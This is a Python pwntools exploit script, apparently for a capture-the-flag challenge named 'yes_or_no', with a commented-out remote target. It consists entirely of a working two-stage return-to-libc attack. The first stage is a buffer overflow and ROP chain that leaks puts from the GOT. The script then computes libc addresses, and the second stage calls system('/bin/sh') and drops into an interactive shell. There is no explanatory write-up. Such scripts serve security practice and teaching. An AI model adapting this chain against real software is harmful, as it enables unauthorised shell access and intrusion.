from pwn import *

context.arch = 'amd64'
context.terminal=['tmux', 'splitw', '-h']

p = process("./yes_or_no")
#p = remote("ctf.j0n9hyun.xyz", 3009)
e = ELF("./yes_or_no")
gdb.attach(p, 'b*0x4007d6')

pr_rdi = 0x400883
ret = 0x40056e
puts_plt = e.plt['puts']
puts_got = e.got['puts']
main = e.symbols['main']
puts_offset = 0x809c0
system_offset = 0x4f440
binsh = 0x1b3e9a

# ------------- Phase 1 -----------------
print p.recvuntil("Show me your number~!")
p.sendline("9830400")
print p.recvuntil("That's cool. Follow me")
payload = ''
payload += "A"*26
payload += p64(pr_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(ret)
payload += p64(main)

p.sendline(payload)

puts_addr = u64(p.recvuntil("\x7f")[-6:] + "\x00\x00")
libc_base = puts_addr - puts_offset
system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh
print "puts_addr : ",hex(puts_addr)
print "libc_base : ",hex(libc_base)
print "system_addr : ",hex(system_addr)
print "/bin/sh addr: ",hex(binsh_addr)

# ------------- Phase 2 -----------------
print p.recvuntil("Show me your number~!")
p.sendline("9830400")
print p.recvuntil("That's cool. Follow me")

payload = ''
payload += "A"*26
payload += p64(pr_rdi)
payload += p64(binsh_addr)
payload += p64(system_addr)

p.sendline(payload)
p.interactive()
